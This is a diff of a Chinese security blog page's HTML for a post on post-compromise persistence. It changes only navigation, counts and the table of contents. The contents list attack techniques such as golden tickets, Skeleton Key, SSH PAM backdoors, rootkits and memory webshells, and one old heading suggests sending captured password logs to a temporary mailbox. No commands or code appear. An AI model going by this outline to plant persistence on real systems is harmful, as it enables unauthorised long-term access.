+  <span id="2023/07/04/SAFE/12 权限维持/" class="item leancloud_visitors" data-flag-title="XD22 12 权限维持" title="阅读次数">
       <span class="icon">
         <i class="ic i-eye"></i>
       </span>
@@ -650,7 +353,7 @@ Servlet-api 类（Servlet 型、Filter 型、Listener 型）<br>
   </li>
   <li class="link">
     <strong>本文链接：</strong>
-    <a href="http://n1h1l157.github.io/2023/07/04/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="">http://n1h1l157.github.io/2023/07/04/SAFE/12 权限维持/</a>
+    <a href="http://n1h1l157.github.io/2023/07/04/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="XD22 12 权限维持">http://n1h1l157.github.io/2023/07/04/SAFE/12 权限维持/</a>
   </li>
   <li class="license">
     <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
@@ -669,20 +372,20 @@ Servlet-api 类（Servlet 型、Filter 型、Listener 型）<br>
     <div class="item left">
       
 
-  <a href="/2023/07/04/SAFE/11%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;wtMDNgHs8rxSKpl.jpg" title="未命名">
+  <a href="/2023/07/04/SAFE/10%20%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;dwNFSq4OhisgMJn.jpg" title="XD22 10 免杀对抗">
   <span class="type">上一篇</span>
-  <span class="category"><i class="ic i-flag"></i> </span>
-  <h3>未命名</h3>
+  <span class="category"><i class="ic i-flag"></i> 信息安全</span>
+  <h3>XD22 10 免杀对抗</h3>
   </a>
 
     </div>
     <div class="item right">
       
 
-  <a href="/2023/07/04/SAFE/13%20%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;BYav6pSg8e1GqNH.jpg" title="未命名">
+  <a href="/2023/07/04/SAFE/11%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;BRgyaX5iTpFLeYQ.jpg" title="XD22 11 内网安全">
   <span class="type">下一篇</span>
-  <span class="category"><i class="ic i-flag"></i> </span>
-  <h3>未命名</h3>
+  <span class="category"><i class="ic i-flag"></i> 信息安全</span>
+  <h3>XD22 11 内网安全</h3>
   </a>
 
     </div>
@@ -701,9 +404,12 @@ Servlet-api 类（Servlet 型、Filter 型、Listener 型）<br>
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="文章目录">
-          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#121-%E5%86%85%E7%BD%91%E5%9F%9F%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90"><span class="toc-number">1.</span> <span class="toc-text"> 12.1 内网域维持权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1211-%E9%AA%8C%E8%AF%81dll%E5%8A%A0%E8%BD%BDssp%E4%B8%8Ehook"><span class="toc-number">1.1.</span> <span class="toc-text"> 12.1.1 验证 DLL 加载 SSP 与 HOOK</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81-dll-%E5%8A%A0%E8%BD%BD-ssp"><span class="toc-number">1.1.1.</span> <span class="toc-text"> # 基于验证 DLL 加载 - SSP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E4%B8%AD%E9%9D%B6%E6%9C%BA%E5%BE%88%E9%9A%BE%E4%BC%9A%E9%87%8D%E5%90%AF%E6%94%BB%E5%87%BB%E8%80%85%E9%87%8D%E5%90%AF%E7%9A%84%E8%AF%9D%E9%A3%8E%E9%99%A9%E8%BF%87%E5%A4%A7%E5%9B%A0%E6%AD%A4%E5%8F%AF%E4%BB%A5%E5%9C%A8%E9%9D%B6"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 攻防实战中，靶机很难会重启，攻击者重启的话风险过大，因此可以在靶</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%BA%E4%B8%8A%E6%8A%8A%E4%B8%A4%E4%B8%AA%E6%96%B9%E6%B3%95%E7%9B%B8%E4%BA%92%E7%BB%93%E5%90%88%E8%B5%B7%E6%9D%A5%E4%BD%BF%E7%94%A8%E6%95%88%E6%9E%9C%E6%AF%94%E8%BE%83%E5%A5%BD%E5%B0%9D%E8%AF%95%E5%88%A9%E7%94%A8%E6%8A%8A%E7%94%9F%E6%88%90%E7%9A%84%E6%97%A5%E5%BF%97%E5%AF%86%E7%A0%81%E6%96%87"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 机上把两个方法相互结合起来使用效果比较好，尝试利用把生成的日志密码文</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%B6%E5%8F%91%E9%80%81%E5%88%B0%E5%86%85%E7%BD%91%E8%A2%AB%E6%8E%A7%E6%9C%BA%E5%99%A8%E6%88%96%E8%80%85%E4%B8%B4%E6%97%B6%E9%82%AE%E7%AE%B1"><span class="toc-number">1.1.4.</span> <span class="toc-text"> 件发送到内网被控机器或者临时邮箱。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E4%BD%86%E5%A6%82%E6%9E%9C%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E9%87%8D%E5%90%AF%E8%A2%AB%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E7%9A%84%E4%BC%AA%E9%80%A0%E7%9A%84ssp%E5%B0%86%E4%BC%9A%E4%B8%A2%E5%A4%B1"><span class="toc-number">1.1.5.</span> <span class="toc-text"> （ 1 ）但如果域控制器重启，被注入内存的伪造的 SSP 将会丢失。</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1212-%E6%9C%BA%E5%88%B6%E8%B4%A6%E5%8F%B7%E5%90%AF%E7%94%A8dsrm"><span class="toc-number">1.2.</span> <span class="toc-text"> 12.1.2 机制账号启用 DSRM</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%B8%A6%E6%9C%BA%E5%88%B6%E6%A8%A1%E5%BC%8Fdsrm%E4%BF%AE%E6%94%B9dsrm%E9%BB%98%E8%AE%A4%E7%99%BB%E5%BD%95%E6%96%B9%E5%BC%8F%E5%92%8C%E5%B1%9E%E6%80%A7%E9%80%9A%E8%BF%87%E5%85%B6"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 利用系统自带机制模式 DSRM，修改 DSRM 默认登录方式和属性，通过其</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1213-%E7%94%A8%E6%88%B7%E5%B1%9E%E6%80%A7%E4%BF%AE%E6%94%B9sid-history"><span class="toc-number">1.3.</span> <span class="toc-text"> 12.1.3 用户属性修改 SID History</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1214-%E7%99%BB%E5%BD%95%E8%BF%9B%E7%A8%8B%E5%8A%AB%E6%8C%81skeleton-key"><span class="toc-number">1.4.</span> <span class="toc-text"> 12.1.4 登录进程劫持 Skeleton Key</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1215-%E9%9A%90%E8%97%8F%E5%9F%9F%E7%AE%A1%E7%94%A8%E6%88%B7"><span class="toc-number">1.5.</span> <span class="toc-text"> 12.1.5 隐藏域管用户</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%9F%9F-%E5%8D%95%E6%9C%BA%E7%89%88-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%9F%BA%E4%BA%8E%E7%94%A8%E6%88%B7-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7"><span class="toc-number">1.5.1.</span> <span class="toc-text"> # 内网域 &amp; 单机版 - 权限维持 - 基于用户 - 隐藏用户</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1216-%E9%BB%84%E9%87%91%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.6.</span> <span class="toc-text"> 12.1.6 黄金白银票据</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1-tgt-%E9%BB%84%E9%87%91%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.6.1.</span> <span class="toc-text"> # 基于服务 TGT- 黄金白银票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E7%84%B6%E5%90%8E%E4%B8%BA%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E7%94%9F%E6%88%90tgt%E8%BF%99%E6%A0%B7%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%8F%98%E6%88%90%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 黄金票据，然后为域管理员生成 TGT，这样普通用户就可以变成域管理员。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E6%96%B9%E6%B3%95"><span class="toc-number">1.6.3.</span> <span class="toc-text"> # 黄金方法：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E6%96%B9%E6%B3%95"><span class="toc-number">1.6.4.</span> <span class="toc-text"> # 白银方法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1217-%E4%B8%8A%E4%BC%A0gotohttp%E4%B8%8Erustdesk"><span class="toc-number">1.7.</span> <span class="toc-text"> 12.1.7 上传 GotoHTTP 与 RustDesk</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#122-windows%E5%8D%95%E6%9C%BA%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90"><span class="toc-number">2.</span> <span class="toc-text"> 12.2 windows 单机维持权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1221-%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="toc-number">2.1.</span> <span class="toc-text"> 12.2.1 自启动</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E8%87%AA%E5%90%AF%E5%8A%A8%E8%B7%AF%E5%BE%84%E5%8A%A0%E8%BD%BD"><span class="toc-number">2.1.1.</span> <span class="toc-text"> （ 1 ）自启动路径加载</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1222-%E7%B2%98%E6%BB%9E%E9%94%AE"><span class="toc-number">2.2.</span> <span class="toc-text"> 12.2.2 粘滞键</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%B8%A6%E7%9A%84%E8%BE%85%E5%8A%A9%E5%8A%9F%E8%83%BD%E8%BF%9B%E8%A1%8C%E6%9B%BF%E6%8D%A2%E6%89%A7%E8%A1%8C%E6%94%BE%E5%A4%A7%E9%95%9C%E6%97%81%E7%99%BD%E5%B1%8F%E5%B9%95%E9%94%AE%E7%9B%98%E7%AD%89%E5%9D%87%E5%8F%AF-%E5%9F%BA"><span class="toc-number">2.2.1.</span> <span class="toc-text"> 系统自带的辅助功能进行替换执行，放大镜，旁白，屏幕键盘等均可。基</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%AC%E6%B2%A1%E7%94%A8%E4%BA%86"><span class="toc-number">2.2.2.</span> <span class="toc-text"> 本没用了。</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1223-%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">2.3.</span> <span class="toc-text"> 12.2.3 映像劫持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1224-%E5%B1%8F%E4%BF%9D%E4%B8%8E%E7%99%BB%E5%BD%95"><span class="toc-number">2.4.</span> <span class="toc-text"> 12.2.4 屏保与登录</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#123-linux%E5%8D%95%E6%9C%BA%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90"><span class="toc-number">3.</span> <span class="toc-text"> 12.3 linux 单机维持权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1231-openssh%E7%89%88%E6%9C%AC%E5%90%8E%E9%97%A8"><span class="toc-number">3.1.</span> <span class="toc-text"> 12.3.1 OpenSSH 版本后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1232-ssh-pam%E5%90%8E%E9%97%A8"><span class="toc-number">3.2.</span> <span class="toc-text"> 12.3.2 SSH PAM 后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1233%E7%99%BB%E5%BD%95%E6%96%B9%E5%BC%8F%E5%90%8E%E9%97%A8"><span class="toc-number">3.3.</span> <span class="toc-text"> 12.3.3 登录方式后门</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-ssh%E8%BD%AF%E9%93%BE%E6%8E%A5"><span class="toc-number">3.3.1.</span> <span class="toc-text"> （ 1 ）SSH 软链接</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1234%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="toc-number">3.4.</span> <span class="toc-text"> 12.3.4 定时任务后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-235-strace%E7%9B%91%E6%8E%A7%E5%90%8E%E9%97%A8"><span class="toc-number">3.5.</span> <span class="toc-text"> 1 2.3.5 Strace 监控后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1236-alias%E5%90%8E%E9%97%A8"><span class="toc-number">3.6.</span> <span class="toc-text"> 12.3.6 Alias 后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1237-rootkit%E5%90%8E%E9%97%A8"><span class="toc-number">3.7.</span> <span class="toc-text"> 12.3.7 Rootkit 后门</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%B1%E4%BA%8Ecenots%E5%86%85%E6%A0%B8%E7%AE%A1%E7%90%86%E4%B8%8D%E4%BE%BF%E6%89%80%E4%BB%A5%E4%BD%BF%E7%94%A8%E4%B8%8B%E8%BD%BD%E5%AF%B9%E5%BA%94%E7%89%88%E6%9C%AC%E7%9A%84kernel-devel%E5%88%B0%E6%9C%AC%E5%9C%B0"><span class="toc-number"></span> <span class="toc-text"> 由于 Cenots 内核管理不便，所以使用下载对应版本的 kernel-devel 到本地</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#124-web%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text"> 12.4 web 内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1241-php%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.1.</span> <span class="toc-text"> 12.4.1 php 内存马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1242-py%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.2.</span> <span class="toc-text"> 12.4.2 py 内存马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1243-java%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.3.</span> <span class="toc-text"> 12.4.3 java 内存马</span></a></li></ol></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%9F%9F%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90"><span class="toc-number">1.</span> <span class="toc-text"> 内网域维持权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81dll%E5%8A%A0%E8%BD%BD-ssp"><span class="toc-number">1.1.</span> <span class="toc-text"> 验证 DLL 加载 SSP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81dll%E5%8A%A0%E8%BD%BD-hook"><span class="toc-number">1.2.</span> <span class="toc-text"> 验证 DLL 加载 HOOK</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%BA%E5%88%B6%E8%B4%A6%E5%8F%B7%E5%90%AF%E7%94%A8dsrm"><span class="toc-number">1.3.</span> <span class="toc-text"> 机制账号启用 DSRM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%B1%9E%E6%80%A7%E4%BF%AE%E6%94%B9"><span class="toc-number">1.4.</span> <span class="toc-text"> 用户属性修改</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E8%BF%9B%E7%A8%8B%E5%8A%AB%E6%8C%81"><span class="toc-number">1.5.</span> <span class="toc-text"> 登录进程劫持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E5%9F%9F%E7%AE%A1%E7%94%A8%E6%88%B7"><span class="toc-number">1.6.</span> <span class="toc-text"> 隐藏域管用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.7.</span> <span class="toc-text"> 黄金票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.8.</span> <span class="toc-text"> 白银票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E7%99%BD%E5%90%8D%E5%8D%95%E5%B7%A5%E5%85%B7"><span class="toc-number">1.9.</span> <span class="toc-text"> 上传白名单工具</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#win-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">2.</span> <span class="toc-text"> win 权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="toc-number">2.1.</span> <span class="toc-text"> 自启动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B2%98%E6%BB%9E%E9%94%AE"><span class="toc-number">2.2.</span> <span class="toc-text"> 粘滞键</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">2.3.</span> <span class="toc-text"> 映像劫持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B1%8F%E4%BF%9D%E4%B8%8E%E7%99%BB%E5%BD%95"><span class="toc-number">2.4.</span> <span class="toc-text"> 屏保与登录</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">3.</span> <span class="toc-text"> linux 权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#openssh%E7%89%88%E6%9C%AC%E5%90%8E%E9%97%A8"><span class="toc-number">3.1.</span> <span class="toc-text"> OpenSSH 版本后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssh-pam%E5%90%8E%E9%97%A8"><span class="toc-number">3.2.</span> <span class="toc-text"> SSH PAM 后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssh%E8%BD%AF%E9%93%BE%E6%8E%A5"><span class="toc-number">3.3.</span> <span class="toc-text"> SSH 软链接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%AC%E7%A7%81%E9%92%A5%E5%90%8E%E9%97%A8"><span class="toc-number">3.4.</span> <span class="toc-text"> 公私钥后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0root%E5%B8%90%E5%8F%B7"><span class="toc-number">3.5.</span> <span class="toc-text"> 添加 root 帐号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="toc-number">3.6.</span> <span class="toc-text"> 定时任务后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#strace-%E7%9B%91%E6%8E%A7%E5%90%8E%E9%97%A8"><span class="toc-number">3.7.</span> <span class="toc-text"> Strace 监控后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#alias%E5%90%8E%E9%97%A8"><span class="toc-number">3.8.</span> <span class="toc-text"> Alias 后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rootkit%E5%90%8E%E9%97%A8"><span class="toc-number">3.9.</span> <span class="toc-text"> Rootkit 后门</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">4.</span> <span class="toc-text"> web 内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">4.1.</span> <span class="toc-text"> php 内存马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#py%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">4.2.</span> <span class="toc-text"> py 内存马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#java%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">4.3.</span> <span class="toc-text"> java 内存马</span></a></li></ol></li></ol>
       </div>
       <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/2023/03/18/SAFE/Trojan/" rel="bookmark" title="Trojan 生成">Trojan 生成</a></li><li><a href="/2023/05/19/SAFE/Linux/" rel="bookmark" title="Linux 命令">Linux 命令</a></li><li><a href="/2023/07/02/SAFE/Security%20URL/" rel="bookmark" title="信息安全 网址">信息安全 网址</a></li><li><a href="/2023/07/04/SAFE/1%20WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="bookmark" title="XD22 1 Web 基础知识">XD22 1 Web 基础知识</a></li><li><a href="/2023/07/04/SAFE/14%20%E6%89%93%E7%A0%B4%E5%B8%B8%E8%A7%84/" rel="bookmark" title="XD22 14 打破常规">XD22 14 打破常规</a></li><li><a href="/2023/07/04/SAFE/11%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" rel="bookmark" title="XD22 11 内网安全">XD22 11 内网安全</a></li><li class="active"><a href="/2023/07/04/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" rel="bookmark" title="XD22 12 权限维持">XD22 12 权限维持</a></li><li><a href="/2023/07/04/SAFE/10%20%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/" rel="bookmark" title="XD22 10 免杀对抗">XD22 10 免杀对抗</a></li><li><a href="/2023/07/04/SAFE/13%20%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/" rel="bookmark" title="XD22 13 补充知识">XD22 13 补充知识</a></li><li><a href="/2023/07/04/SAFE/2%20WEB%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/" rel="bookmark" title="XD22 2 Web 通用漏洞">XD22 2 Web 通用漏洞</a></li><li><a href="/2023/07/04/SAFE/3%20%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 3 服务攻防">XD22 3 服务攻防</a></li><li><a href="/2023/07/04/SAFE/5%20APP%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 5 APP 攻防">XD22 5 APP 攻防</a></li><li><a href="/2023/07/04/SAFE/4%20API%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 4 API 攻防">XD22 4 API 攻防</a></li><li><a href="/2023/07/04/SAFE/6%20%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8/" rel="bookmark" title="XD22 6 漏洞发现及利用">XD22 6 漏洞发现及利用</a></li><li><a href="/2023/07/04/SAFE/7%20waf%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 7 Waf 攻防">XD22 7 Waf 攻防</a></li><li><a href="/2023/07/04/SAFE/8%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="bookmark" title="XD22 8 代码审计">XD22 8 代码审计</a></li><li><a href="/2023/07/04/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="bookmark" title="XD22 9 权限提升">XD22 9 权限提升</a></li>
+        </ul>
       </div>
       <div class="overview panel" data-title="站点概览">
         <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -716,7 +422,7 @@ Servlet-api 类（Servlet 型、Filter 型、Listener 型）<br>
 <nav class="state">
     <div class="item posts">
       <a href="/archives/">
-        <span class="count">166</span>
+        <span class="count">167</span>
         <span class="name">文章</span>
       </a>
     </div>
@@ -728,7 +434,7 @@ Servlet-api 类（Servlet 型、Filter 型、Listener 型）<br>
     </div>
     <div class="item tags">
       <a href="/tags/">
-        <span class="count">40</span>
+        <span class="count">39</span>
         <span class="name">标签</span>
       </a>
     </div>
@@ -811,12 +517,12 @@ Servlet-api 类（Servlet 型、Filter 型、Listener 型）<br>
 
   <ul id="quick">
     <li class="prev pjax">
-        <a href="/2023/07/04/SAFE/11%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+        <a href="/2023/07/04/SAFE/10%20%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
     </li>
     <li class="up"><i class="ic i-arrow-up"></i></li>
     <li class="down"><i class="ic i-arrow-down"></i></li>
     <li class="next pjax">
-        <a href="/2023/07/04/SAFE/13%20%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+        <a href="/2023/07/04/SAFE/11%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
     </li>
     <li class="percent"></li>
   </ul>
@@ -838,10 +544,10 @@ Servlet-api 类（Servlet 型、Filter 型、Listener 型）<br>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
 </div>
 
-    <span><a href="/2023/06/30/BOOK/14%E3%80%8A%E4%B8%8E%E6%8A%91%E9%83%81%E7%97%87%E7%9B%B8%E4%BC%B4%E7%9A%84%E6%97%A5%E5%AD%90%E3%80%8B%E9%A9%AC%E4%BF%AE/" title="《与抑郁症相伴的日子》马修">《与抑郁症相伴的日子》马修</a></span>
+    <span><a href="/2023/07/03/MBTI/%E5%BF%83%E7%90%86%E5%AD%A6%E6%B5%8B%E8%AF%95/" title="心理学测试">心理学测试</a></span>
   </li>
 
       
@@ -851,7 +557,7 @@ Servlet-api 类（Servlet 型、Filter 型、Listener 型）<br>
 <a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
 </div>
 
-    <span><a href="/2023/04/01/MBTI/ISFJ%E8%A7%A3%E8%AF%BB/" title="ISFJ解读">ISFJ解读</a></span>
+    <span><a href="/2023/07/03/MBTI/INFJ%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/" title="INFJ 深度解析">INFJ 深度解析</a></span>
   </li>
 
       
@@ -868,49 +574,20 @@ Servlet-api 类（Servlet 型、Filter 型、Listener 型）<br>
   <li class="item">
     
 <div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
 </div>
 
-    <span><a href="/2023/07/04/SAFE/7%20waf%E6%94%BB%E9%98%B2/" title="未命名">未命名</a></span>
+    <span><a href="/2023/04/01/MBTI/ESFP%E8%A7%A3%E8%AF%BB/" title="ESFP解读">ESFP解读</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+<a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="分类于 信息安全">信息安全</a>
 </div>
 
-    <span><a href="/2023/07/02/VULNHUB/112%20THOTH/" title="VULNHUB 12 THOTH">VULNHUB 12 THOTH</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
-</div>
-
